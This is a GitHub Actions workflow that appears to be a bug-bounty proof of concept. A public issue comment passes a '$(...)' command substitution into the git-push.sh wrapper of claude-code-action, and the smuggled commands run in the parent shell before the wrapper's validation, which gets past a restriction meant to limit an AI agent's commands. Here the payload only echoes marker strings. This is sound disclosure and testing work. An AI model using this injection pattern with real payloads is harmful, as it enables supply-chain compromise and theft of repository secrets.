name: H1 Public Wrapper Command Proof

on:
  issue_comment:
    types: [created]

permissions:
  contents: read

jobs:
  public-comment-wrapper-command:
    if: contains(github.event.comment.body, 'H1_PUBLIC_WRAPPER_COMMAND_PROOF')
    runs-on: ubuntu-latest
    env:
      COMMENT_BODY: ${{ github.event.comment.body }}
      EXPECTED_PUBLIC_COMMAND: '"$GITHUB_ACTION_PATH/scripts/git-push.sh" origin "$(echo H1_SUPPLY_CHAIN_SECRET_READ_IN_PARENT_SHELL >&2; echo parent_shell_executed=True >&2; echo executed_before_wrapper_validation=True >&2)"'
    steps:
      - name: Checkout official claude-code-action v1
        uses: actions/checkout@v4
        with:
          repository: anthropics/claude-code-action
          ref: v1
          path: official-action
          fetch-depth: 1

      - name: Validate public comment command
        shell: bash
        run: |
          set -euo pipefail

          echo "trigger_actor=${GITHUB_ACTOR}"
          echo "comment_author=${{ github.event.comment.user.login }}"

          if printf '%s\n' "$COMMENT_BODY" | grep -Fxq "$EXPECTED_PUBLIC_COMMAND"; then
            echo "expected_public_command_found=True"
          else
            echo "expected_public_command_found=False"
            echo "proof_result=missing_exact_public_command"
            exit 1
          fi

          if printf '%s' "$COMMENT_BODY" | grep -qF 'git-push.sh'; then
            echo "comment_contains_git_push_wrapper=True"
          else
            echo "comment_contains_git_push_wrapper=False"
          fi

          if printf '%s' "$COMMENT_BODY" | grep -qF '$('; then
            echo "comment_contains_command_substitution=True"
          else
            echo "comment_contains_command_substitution=False"
          fi

          echo "public_comment_supplied_shell_command=True"
          printf 'submitted_command=%s\n' "$EXPECTED_PUBLIC_COMMAND"

      - name: Execute exact whitelisted non-destructive command
        shell: bash
        run: |
          set +e

          export GITHUB_ACTION_PATH="$GITHUB_WORKSPACE/official-action"

          printf 'before_wrapper_call=%s\n' "$(date -u +%FT%TZ)"

          "$GITHUB_ACTION_PATH/scripts/git-push.sh" origin "$(
            echo H1_SUPPLY_CHAIN_SECRET_READ_IN_PARENT_SHELL >&2
            echo parent_shell_executed=True >&2
            echo executed_before_wrapper_validation=True >&2
          )"
          status=$?

          printf 'wrapper_exit=%s\n' "$status"
          printf 'after_wrapper_return=%s\n' "$(date -u +%FT%TZ)"

          if [ "$status" -ne 1 ]; then
            echo "proof_result=unexpected_wrapper_exit"
            exit 1
          fi

          echo "secret_value_printed=False"
          echo "proof_result=public_comment_supplied_shell_command_executed_before_wrapper_validation"
